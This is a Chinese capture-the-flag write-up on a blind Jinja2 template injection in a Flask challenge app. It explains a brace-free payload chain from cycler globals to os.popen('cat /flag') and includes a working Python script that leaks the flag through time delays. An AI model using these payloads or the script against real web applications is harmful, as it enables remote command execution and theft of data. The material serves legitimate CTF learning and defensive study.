## 1. 题目描述

“盲”SSTI（Server-Side Template Injection）挑战：某些模板注入点对花括号或百分号有限制，无法直接把 `{{ ... }}` 或 `{% ... %}` 放进输入。需要利用模板语法在不出现被拦截字符的前提下，让注入表达式被执行，并通过时间侧信道完成盲注，最终读取容器内 `/flag`。

---

## 2. 知识点

- Flask + Jinja2 模板渲染的语法与上下文对象（如 `cycler`、`config` 等可达路径）
- SSTI 中的属性链逃逸：`cycler.__init__.__globals__['__builtins__']` → `__import__('time')`、`open`/`os.popen`
- 盲注技巧：时间延迟侧信道（time-based）而非页面回显
- 绕过字符过滤：不在 payload 中出现 `{`、`}`、`%`，改用 `ord()` 数值比较判断字符

---

## 3. 解题方法思路

源码关键点（`app/website/app/routes.py`）：

- `/amortization?term=...` 中把 `term` 直接拼接进模板源码：
  - 模板片段：`{% for row in range({term}) %}`
  - 路由过滤：仅禁止了 `"{"`、`"}"`、`"%"`，但没有禁止括号、引号、点号、下划线等
- 因此我们可以令 `term` = 一个可执行的 Python 表达式；例如：
  - 触发延迟（验证执行能力）：`((cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(2)) or 10)`
  - 若生效，响应耗时会≈2s；否则≈瞬时
- 做“盲”泄露：
  - 读取 `/flag`：`os.popen('cat /flag').read()` 或 `open('/flag').read()`
  - 逐字节判断：不直接比较字符（因为 `{`、`}` 会被 WAF 过滤），而是比较 `ord(flag[i]) == 123/125/...`
  - 条件成立则 `sleep(S)`，否则直接返回 `10`，通过响应时间判断真假

---

## 4. 解题步骤

1) 访问功能页并确认注入点
- 打开 `http://ip32786/amortization?term=5` 可看到表格正常渲染
- 测试延迟：
  - `term=((cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(3)) or 10)`
  - 正常响应≈0.01s；注入后≈3.0s → 证实语句被执行

2) 构建时间盲注判断表达式
- 判定第 i 位是否为字符 ASCII x：
  - `(( ord( os.popen('cat /flag').read()[i] ) == x ) and sleep(S)) or 10`
- 将 `ord` 与 `__import__('os')` 通过 `cycler.__init__.__globals__['__builtins__']` 访问，避免出现被过滤字符

3) 自动化逐字符泄露
- 以较小延迟 S（如 1.8s）和合适阈值（baseline + 60%·S）进行判断
- 遇到 `}` 终止

4) 拿到 Flag
- 跑脚本后获得：`FLAG`

---

## 5. EXP（Python）

说明：
- Windows 下直接用系统自带的 `curl.exe -w %{time_total}` 统计响应耗时，较 `requests` 更稳定；
- 默认 SLEEP=2.0，基线采用多次平均；每个字符做“两次测量确认”，并把进度写入 `final_flag.txt` 以便中断续跑（重新运行即可继续）。

```python
import time
import subprocess
from urllib.parse import quote

BASE = 'http://ip32786'
URL = BASE + '/amortization?term={}'
SLEEP = 2.0
TIMEOUT = 40
MAX_LEN = 64
OUT_FILE = 'final_flag.txt'

BUILTINS_PATH = "cycler.__init__.__globals__['__builtins__']"
FLAG_READ = f"{BUILTINS_PATH}['__import__']('os').popen('cat /flag').read()"
ORD = f"{BUILTINS_PATH}['ord']"
SLEEP_CALL = f"{BUILTINS_PATH}['__import__']('time').sleep({SLEEP})"


def curl_time(url: str) -> float:
    res = subprocess.run(
        ["curl.exe", "-s", "-o", "NUL", "-w", "%{time_total}", url],
        capture_output=True, text=True, timeout=TIMEOUT
    )
    out = res.stdout.strip()
    return float(out or '0')


def baseline(samples: int = 5) -> float:
    vals = [curl_time(URL.format('10')) for _ in range(samples)]
    return sum(vals) / len(vals)


def build_payload(index: int, code: int) -> str:
    cond = f"({ORD}({FLAG_READ}[{index}])=={code})"
    expr = f"(({cond} and {SLEEP_CALL}) or 10)"
    return quote(expr, safe='')


def leak():
    base = baseline()
    threshold = base + SLEEP * 0.6
    print(f"Baseline={{base:.3f}}s Threshold={{threshold:.3f}}s")
    out = ''
    for i in range(MAX_LEN):
        found = False
        for code in range(32, 127):  # 可打印 ASCII
            url = URL.format(build_payload(i, code))
            t1 = curl_time(url)
            t2 = curl_time(url)
            if t1 > threshold and t2 > threshold:
                ch = chr(code)
                out += ch
                print(ch, end='', flush=True)
                try:
                    with open(OUT_FILE, 'w', encoding='utf-8') as f:
                        f.write(out)
                except Exception:
                    pass
                found = True
                break
        if not found:
            print(f"\n[!] No match at position {i}. Partial flag: {out}")
            break
        if out.endswith('}'):
            break
    print(f"\n\nFLAG = {out}")
    return out


if __name__ == '__main__':
    leak()
```

小贴士：
- 若网络抖动较大，可把 `SLEEP` 调大到 2.5，并把阈值设为 `base + 0.7 * SLEEP`；
- 如仍出现误判，可把确认次数从 2 次增至 3 次（连判 3 次都超阈才接受）。
